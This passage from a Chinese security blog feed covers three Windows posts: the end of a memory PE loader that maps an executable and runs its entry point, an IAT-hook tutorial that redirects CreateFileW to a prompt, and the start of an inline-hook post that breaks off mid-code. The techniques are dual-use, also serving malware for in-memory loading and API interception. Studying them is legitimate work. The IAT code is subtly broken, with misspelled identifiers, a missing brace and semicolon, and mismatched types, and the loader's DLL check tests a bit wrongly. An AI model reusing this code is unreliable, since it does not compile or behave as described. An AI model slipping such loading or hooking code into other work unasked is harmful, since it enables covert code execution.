class="built_in">printf</span>(<span class="string">&quot;[+] Fix DllName: %S\n&quot;</span>, wcDllName);</span><br><span class="line">hDll = <span class="built_in">GetModuleHandle</span>(wcDllName);</span><br><span class="line"><span class="keyword">if</span> (hDll == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">hDll = <span class="built_in">LoadLibrary</span>(wcDllName);</span><br><span class="line"><span class="keyword">if</span> (hDll == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">pImport++;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)((BYTE*)lpBaseAddress + pImport-&gt;FirstThunk);</span><br><span class="line"><span class="keyword">while</span> (pThunk-&gt;u1.AddressOfData)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (pThunk-&gt;u1.Ordinal &amp; IMAGE_ORDINAL_FLAG64)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\t[+] Fix By Ordinal: %I64d\n&quot;</span>, pThunk-&gt;u1.Ordinal &amp; <span class="number">0x0000FFFF</span>);</span><br><span class="line">lpFuncAddress = <span class="built_in">GetProcAddress</span>(hDll, (LPCSTR)(pThunk-&gt;u1.Ordinal &amp; <span class="number">0x0000FFFF</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">pName = (PIMAGE_IMPORT_BY_NAME)(pThunk-&gt;u1.AddressOfData + (BYTE*)lpBaseAddress);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\t[+] Fix By Name: %s\n&quot;</span>, pName-&gt;Name);</span><br><span class="line">lpFuncAddress = <span class="built_in">GetProcAddress</span>(hDll, pName-&gt;Name);</span><br><span class="line">&#125;</span><br><span class="line">pThunk-&gt;u1.Function = (ULONGLONG)lpFuncAddress;</span><br><span class="line">pThunk++;</span><br><span class="line">&#125;</span><br><span class="line">pImport++;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断是EXE还是DLL</span></span><br><span class="line"><span class="function">BOOL <span class="title">IsExeOrDll</span><span class="params">(LPVOID lpBaseAddress)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpBaseAddress;</span><br><span class="line">PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD64)lpBaseAddress);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((pNt-&gt;FileHeader.Characteristics &amp; <span class="number">0x00002000</span>) == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">CallDllMain</span><span class="params">(LPVOID lpBaseAddress)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">typedef_DllMain DllMain = <span class="literal">NULL</span>;</span><br><span class="line">PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddress;</span><br><span class="line">PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((DWORD64)pDosHeader + pDosHeader-&gt;e_lfanew);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">IsExeOrDll</span>(lpBaseAddress))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 表示EXE执行</span></span><br><span class="line"><span class="comment">//DWORD64 lpExeEntry = (DWORD64)(pNtHeaders-&gt;OptionalHeader.AddressOfEntryPoint + (DWORD64)lpBaseAddress);</span></span><br><span class="line">HANDLE hThread = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)((BYTE*)lpBaseAddress + pNtHeaders-&gt;OptionalHeader.AddressOfEntryPoint), <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line">DllMain = (typedef_DllMain)((DWORD64)pDosHeader + pNtHeaders-&gt;OptionalHeader.AddressOfEntryPoint);</span><br><span class="line"><span class="comment">// 调用入口函数,附加进程DLL_PROCESS_ATTACH</span></span><br><span class="line">BOOL bRet = <span class="built_in">DllMain</span>((HINSTANCE)lpBaseAddress, DLL_PROCESS_ATTACH, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (FALSE == bRet)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;DllMain\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">wchar_t</span> wcFilePath[MAX_PATH] = <span class="string">L&quot;D:\\xxx.exe&quot;</span>;</span><br><span class="line"><span class="comment">// 打开文件句柄</span></span><br><span class="line">HANDLE hFile = <span class="built_in">CreateFile</span>(wcFilePath, GENERIC_READ, FILE_SHARE_READ, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (INVALID_HANDLE_VALUE == hFile)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;CreateFile Failed\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">DWORD dwFileSize = <span class="built_in">GetFileSize</span>(hFile, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;GetFileSize: %d\n&quot;</span>, dwFileSize);</span><br><span class="line">LPVOID lpBuffer = <span class="keyword">new</span> BYTE[dwFileSize];</span><br><span class="line">DWORD lpNumberOfBytesRead = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (FALSE == <span class="built_in">ReadFile</span>(hFile, lpBuffer, dwFileSize, &amp;lpNumberOfBytesRead, <span class="literal">NULL</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ReadFile Failed\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;lpBuffer: %x\n&quot;</span>, *((PBYTE)lpBuffer + <span class="number">1</span>));</span><br><span class="line"><span class="comment">// 获取ImageSize</span></span><br><span class="line">DWORD dwSizeOfImage = <span class="built_in">GetSizeOfImage</span>(lpBuffer);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;GetSizeOfImage: %d\n&quot;</span>, dwSizeOfImage);</span><br><span class="line">LPVOID lpBaseAddress = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, dwSizeOfImage, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (lpBaseAddress == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;VirtualAlloc Failed\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// FileBuffer ==&gt; ImageBuffer</span></span><br><span class="line"><span class="keyword">if</span> (FALSE == <span class="built_in">MemMapFile</span>(lpBuffer, lpBaseAddress))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;MemMapFile Failed\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;lpBaseAddress: %08x\n&quot;</span>, *((PBYTE)lpBaseAddress + <span class="number">1</span>));</span><br><span class="line"><span class="comment">// 修正重定位表</span></span><br><span class="line"><span class="keyword">if</span> (FALSE == <span class="built_in">FixRelocation</span>(lpBaseAddress))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;FixRelocation Failed\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 修正导入表</span></span><br><span class="line"><span class="keyword">if</span> (FALSE == <span class="built_in">FixImportTable</span>(lpBaseAddress))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;FixImportTable Failed\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 修改内存属性</span></span><br><span class="line">DWORD lpflOldProtect = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (FALSE == <span class="built_in">VirtualProtect</span>(lpBaseAddress, dwSizeOfImage, PAGE_EXECUTE_READWRITE, &amp;lpflOldProtect))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;VirtualProtectEx Failed\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 修改入口点</span></span><br><span class="line"><span class="keyword">if</span> (FALSE == <span class="built_in">CallDllMain</span>(lpBaseAddress))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;CallDllMain Failed\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="仓库地址"><a href="#仓库地址" class="headerlink" title="仓库地址"></a>仓库地址</h2><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/Dooookey/PELoader_Demo"><img src="https://github-readme-stats.vercel.app/api/pin/?username=Dooookey&repo=PELoader_Demo&show_owner=true" class="lazyload" data-srcset="https://github-readme-stats.vercel.app/api/pin/?username=Dooookey&repo=PELoader_Demo&show_owner=true" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="/></a><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><div class="note info"><p><strong>参考书籍</strong></p><ul><li>《Windwos黑客编程技术详解》第4章第3节</li></ul></div><p>参考Blog</p><div class="btns rounded wide grid5">            <a class="button" href='https://www.kn0sky.com/?p=37#%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD%E6%8A%80%E6%9C%AF%E7%9A%84%E5%8E%9F%E7%90%86%E5%AE%9E%E7%8E%B0' title='kn0sky'><img src='https://www.kn0sky.com/upload/anvtor.jpg'>kn0sky</a><a class="button" href='https://www.lyshark.com/post/3c1b31b5.html' title='lyshark'><img src='https://www.lyshark.com/about/about.png'>lyshark</a>          </div>]]></content>
      
      
      <categories>
          
          <category> Windows PE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows PE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IAT-Hook</title>
      <link href="/3aecea41.html"/>
      <url>/3aecea41.html</url>
      
        <content type="html"><![CDATA[<div class="note info"><p><strong>IAT Hook</strong></p><ul><li><code>IMAGE_IMPORT_DESCRIPTOR</code>中两个<code>IMAGE_THUNK_DATA</code>结构体，第一个位导入名称表（INT），第二个位导入地址表（IAT）。两个结构在磁盘文件中时是没有差别的，但是当PE文件被装载到内存中后，<code>FirstThunk</code>字段指向的<code>IMAGE_THUNK_DATA</code>的值会被Windows进行填充。该值为一个RVA，该RVA加上映像基址后，虚拟地址就保存了真正的导入函数的入口地址</li><li>IAT Hook步骤<ol><li>获取欲Hook的函数地址</li><li>找到该函数的所保存的IAT地址</li><li>把IAT中该函数的地址修改为Hook函数的地址</li></ol></li></ul></div><span id="more"></span><h2 id="遍历64位IAT函数名和地址"><a href="#遍历64位IAT函数名和地址" class="headerlink" title="遍历64位IAT函数名和地址"></a>遍历64位IAT函数名和地址</h2><div class="note red bug"><p><strong>遍历64位IAT函数名和地址</strong></p><ul><li><code>GetModuleHandle</code>：参数只有1个，是目标模块名，此处填NULL表示当前进程，返回的是一个进程句柄，也就是当前进程的首地址</li></ul><hr><ul><li>区别：<ul><li>64位程序的基地址是<code>Unsigned Long Long</code>类型，用DWORD64表示</li><li>运行中的程序，IAT里记录的是VA而不是RVA</li><li>运行中的程序，INT里记录的是RVA而不是VA</li></ul></li></ul></div><h3 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 获取当前程序的首地址</span></span><br><span class="line">    HMODULE hModuel = <span class="built_in">GetModuleHandle</span>(<span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">// 定位DOS头</span></span><br><span class="line">    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;</span><br><span class="line">    <span class="comment">// 定位NT头</span></span><br><span class="line">    PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((DWORD64)hModule + pDosHeader-&gt;e_lfanew);</span><br><span class="line">    <span class="comment">// 获取导入表RVA</span></span><br><span class="line">    DWORD64 dwImportRVA = pNtHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;</span><br><span class="line">    <span class="comment">// 定位导入表</span></span><br><span class="line">    PIMAGE_IMPORT_DESCRIPTOR pImport = (PIMAGE_IMPORT_DESCRIPTOR)(dwImportRVA + (DWORD64)hModule);</span><br><span class="line">    <span class="keyword">while</span>(pImport-&gt;Name)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">const</span> <span class="type">char</span>* szDllName = (<span class="type">char</span>*)((DWORD64)hModule + pImport-&gt;Name);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, szDllName);</span><br><span class="line">        PIMAGE_THUNK_DATA pIAT = (PIMAGE_THUNK_DATA)((DWORD64)hModule + pImport-&gt;FirstThunk);</span><br><span class="line">        PIMAGE_THUNK_DATA pINT = (PIMAGE_THUNK_DATA)((DWORD64)hModule + pImport-&gt;OriginalFirstThunk);</span><br><span class="line">        <span class="keyword">if</span>(pIAT-&gt;u1.Oridianl != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">while</span>(pIAT-&gt;u1.Function)</span><br><span class="line">                </span><br><span class="line">                PIMAGE_IMPORT_BY_NAME pFuncName = (PIMAGE_IMPORT_BY_NAME)((DWORD64)hModule + pINT-&gt;AddressOfData);</span><br><span class="line">                PDWORD64 dwFuncAddr = (PDWORD64)(pIAT-&gt;Function);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;函数名称：%-50s&quot;</span>, pFuncName);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;函数地址：%p\n&quot;</span>, dwFuncAddr);</span><br><span class="line">                pINT++;</span><br><span class="line">                pIAT++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        pImport++;</span><br><span class="line">       </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Hook-CreateFileW"><a href="#Hook-CreateFileW" class="headerlink" title="Hook CreateFileW"></a>Hook CreateFileW</h2><h3 id="代码示例-1"><a href="#代码示例-1" class="headerlink" title="代码示例"></a>代码示例</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">HANDLE</span></span><br><span class="line"><span class="function">WINAPI</span></span><br><span class="line"><span class="function"><span class="title">MyCreateFileW</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ LPCWSTR lpFileName,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ DWORD dwDesiredAccess,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ DWORD dwShareMode,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ DWORD dwCreationDisposition,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ DWORD dwFlagsAndAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ HANDLE hTemplateFile</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">MessageBox</span>(<span class="literal">NULL</span>, <span class="string">L&quot;打开文件操作被拦截&quot;</span>, <span class="string">L&quot;提示&quot;</span>, MB_YESNO) == IDYES)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">CreateFileW</span>(</span><br><span class="line">            lpFileName,</span><br><span class="line">            dwDesiredAccess,</span><br><span class="line">            dwShareMode,</span><br><span class="line">            lpSecurityAttributes,</span><br><span class="line">            dwCreationDisposition,</span><br><span class="line">            dwFlagsAndAttributes,</span><br><span class="line">            hTemplateFile</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">MessageBox</span>(<span class="literal">NULL</span>, <span class="string">L&quot;文件打开失败&quot;</span>, <span class="string">L&quot;警告&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">IATHook</span><span class="params">(LPCWSTR lpModuleName, <span class="type">const</span> <span class="type">char</span>* szFuncName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD64 dwFuncAddr = (DWROD64)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(lpModuleName), szFuncName);</span><br><span class="line">    <span class="comment">// 获取程序基址</span></span><br><span class="line">    HMODULE hModule = <span class="built_in">GetModuleHandle</span>(<span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">// 定位DOS头</span></span><br><span class="line">    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;</span><br><span class="line">    <span class="comment">// 定位NT头</span></span><br><span class="line">    PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((DWORD64)hModule + pDosHeader-&gt;e_lfanew);</span><br><span class="line">    <span class="comment">// 获取导入表RVA</span></span><br><span class="line">    DWORD64 dwImportRVA = pNtHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;</span><br><span class="line">    <span class="comment">// 定位导入表</span></span><br><span class="line">    PIMAGE_IMPORT_DESCRIPTOR pImport = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD64)hModule + dwImportRVA);</span><br><span class="line">    <span class="keyword">while</span>(pImport-&gt;Nmae)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">const</span> <span class="type">char</span>* szDllName = (<span class="type">char</span>*)((DWORD64)hModule + pImport-&gt;Name);</span><br><span class="line">        <span class="type">char</span> szName[MAXBYTE] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        <span class="built_in">strcpy_s</span>(szName, szDllName)</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strcmp</span>(_strlwr(szName), <span class="string">&quot;kernel32.dll&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)((DWORD64)hModule + pImport-&gt;FirstThunk);</span><br><span class="line">            <span class="keyword">while</span>(pThunk-&gt;Function)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(pThunk-&gt;Function == dwFuncAddr)</span><br><span class="line">                &#123;</span><br><span class="line">                    DWORD64 dwOldProtect;</span><br><span class="line">                    <span class="built_in">VirtualProtectEx</span>(<span class="built_in">GetCurrentProcess</span>(), (LPVOID)&amp;pThunk-&gt;Function, <span class="number">8</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);</span><br><span class="line">                    pThunk-&gt;Function = (DWORD64)MyCreateFileW;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                pThunk++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        pImport++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">                       DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function">                       LPVOID lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function">                     )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        <span class="built_in">IATHook</span>(<span class="string">L&quot;kernel32.dll&quot;</span>, <span class="string">L&quot;CreateFileW&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows Hook </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Inline Hook</title>
      <link href="/1b00de47.html"/>
      <url>/1b00de47.html</url>
      
        <content type="html"><![CDATA[<div class="note info"><p><strong>Inline Hook(内联钩子注入)流程</strong></p><ol><li>构造跳转指令[JMP后的偏移量 &#x3D; 目标地址 - 原地址 - jcc的指令长度]</li><li>在内存中找到欲HOOK函数地址，并保存欲HOOK位置处的前5个字节</li><li>将构造的跳转指令写入需HOOK的位置处</li><li>当被HOOK位置被执行时会转到自己的流程执行</li><li>如果要执行原来的流程，取消HOOK，还原被修改的字节</li><li>执行原来的流程</li><li>继续HOOK住原来的位置</li></ol></div><span id="more"></span><h2 id="仓库地址"><a href="#仓库地址" class="headerlink" title="仓库地址"></a>仓库地址</h2><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/Dooookey/Inline_Hook"><img src="https://github-readme-stats.vercel.app/api/pin/?username=Dooookey&repo=Inline_Hook&show_owner=true" class="lazyload" data-srcset="https://github-readme-stats.vercel.app/api/pin/?username=Dooookey&repo=Inline_Hook&show_owner=true" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="/></a><h2 id="5字节Inline-Hook（x86）"><a href="#5字节Inline-Hook（x86）" class="headerlink" title="5字节Inline Hook（x86）"></a>5字节Inline Hook（x86）</h2><div class="note message"><p><strong></strong></p><ul><li>5字节<code>Inline Hook</code>中jcc指令长度为5</li><li>根据计算公式：JMP后的偏移量 &#x3D; 目标地址 - 原地址- 5</li></ul></div><h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">PROC m_FuncAddress;     <span class="comment">// 要Hook的函数地址</span></span><br><span class="line">BYTE m_OldBytes[<span class="number">5</span>];     <span class="comment">// 要Hook函数的头5个字节</span></span><br><span class="line">BYTE m_NewBytes[<span class="number">5</span>];     <span class="comment">// 要替换到目标函数头五个字节的新字节（jmp 